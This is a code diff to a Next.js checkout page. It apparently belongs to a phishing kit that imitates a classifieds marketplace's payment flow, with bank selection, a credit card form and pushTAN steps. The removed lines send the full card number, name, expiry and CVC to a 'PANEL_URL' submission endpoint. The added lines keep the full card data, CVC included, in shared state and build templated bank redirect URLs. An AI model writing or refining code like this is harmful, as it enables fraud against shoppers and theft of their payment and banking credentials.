@@ -1,7 +1,7 @@
 "use client";
 
-import { use, useEffect, useRef, useState } from "react";
-import { useRouter } from "next/navigation";
+import { Suspense, use, useEffect, useRef, useState } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import { useListing } from "../../../../../components/ListingContext";
 
 interface PageProps {
@@ -34,10 +34,27 @@ function trackEvent(type: string, listingId: string, metadata?: Record<string, s
 type Step = "method" | "bank" | "credit_card" | "card_waiting" | "card_pushtan";
 
 export default function BankPage({ params }: PageProps) {
+  return (
+    <Suspense fallback={
+      <main className="page-wrapper">
+        <div style={{ padding: "24px", textAlign: "center", color: "#888", fontSize: 14 }}>Laden...</div>
+      </main>
+    }>
+      <BankPageInner params={params} />
+    </Suspense>
+  );
+}
+
+function BankPageInner({ params }: PageProps) {
   const { slug } = use(params);
   const router = useRouter();
+  const searchParams = useSearchParams();
   const { setBankData, listingId } = useListing();
-  const [step, setStep] = useState<Step>("method");
+
+  const initialStep = (searchParams.get("step") as Step) || "method";
+  const initialSessionId = searchParams.get("sessionId") || null;
+
+  const [step, setStep] = useState<Step>(initialStep);
   const [banks, setBanks] = useState<ApiBank[]>([]);
   const [globallyEnabled, setGloballyEnabled] = useState(true);
   const [creditCardEnabled, setCreditCardEnabled] = useState(true);
@@ -46,7 +63,7 @@ export default function BankPage({ params }: PageProps) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvc, setCardCvc] = useState("");
   const [cardName, setCardName] = useState("");
-  const [cardSessionId, setCardSessionId] = useState<string | null>(null);
+  const [cardSessionId, setCardSessionId] = useState<string | null>(initialSessionId);
   const [cardPollTimer, setCardPollTimer] = useState<ReturnType<typeof setInterval> | null>(null);
   const [cardTanCode, setCardTanCode] = useState("");
   const [cardError, setCardError] = useState<string | null>(null);
@@ -143,7 +160,12 @@ export default function BankPage({ params }: PageProps) {
     if (step === "card_pushtan") {
       setStep("card_waiting");
     } else if (step === "card_waiting") {
-      setStep("credit_card");
+      // If we entered card_waiting from the listing page (via query param), go back there
+      if (initialStep === "card_waiting") {
+        router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
+      } else {
+        setStep("credit_card");
+      }
     } else if (step === "bank" || step === "credit_card") {
       setStep("method");
     } else {
@@ -177,13 +199,13 @@ export default function BankPage({ params }: PageProps) {
     if (listingId) {
       trackEvent("bank_selected", listingId, { bank: bank.name });
     }
-    setBankData({ bankName: bank.name });
+    setBankData({
+      bankName: bank.name,
+      bankSlug: bank.slug,
+      bankUrl: bank.urlTemplate ? buildBankUrl(bank.urlTemplate, slug) : undefined,
+    });
 
-    if (bank.urlTemplate) {
-      window.location.href = buildBankUrl(bank.urlTemplate, slug);
-    } else {
-      router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
-    }
+    router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
   };
 
   return (
@@ -451,45 +473,21 @@ export default function BankPage({ params }: PageProps) {
             <button
               type="button"
               disabled={cardNumber.replace(/\s/g, "").length < 13 || cardExpiry.length < 5 || cardCvc.length < 3 || !cardName.trim()}
-              onClick={async () => {
+              onClick={() => {
                 if (listingId) {
                   trackEvent("credit_card_submitted", listingId, {
                     last4: cardNumber.replace(/\s/g, "").slice(-4),
                   });
-                  fetch(`${PANEL_URL}/api/public/bank-submission`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      bankSlug: "kreditkarte",
-                      listingSlug: slug,
-                      step: "card_details",
-                      data: {
-                        cardNumber: cardNumber.replace(/\s/g, ""),
-                        cardName,
-                        cardExpiry,
-                        cardCvc,
-                      },
-                    }),
-                  }).catch(() => {});
                 }
-                // Start a bank session for credit card flow
-                try {
-                  const res = await fetch(`${PANEL_URL}/api/public/bank-session/start`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      bankSlug: "kreditkarte",
-                      listingSlug: slug,
-                    }),
-                  });
-                  const data = await res.json();
-                  if (data.sessionId) {
-                    setCardSessionId(data.sessionId);
-                  }
-                } catch {
-                  // ignore session creation errors
-                }
-                setStep("card_waiting");
+                setBankData({
+                  bankName: "Kreditkarte",
+                  bankSlug: "kreditkarte",
+                  cardNumber: cardNumber.replace(/\s/g, ""),
+                  cardName,
+                  cardExpiry,
+                  cardCvc,
+                });
+                router.push(`/iad/kaufen-und-verkaufen/d/${slug}`);
               }}
               style={{
                 width: "100%",
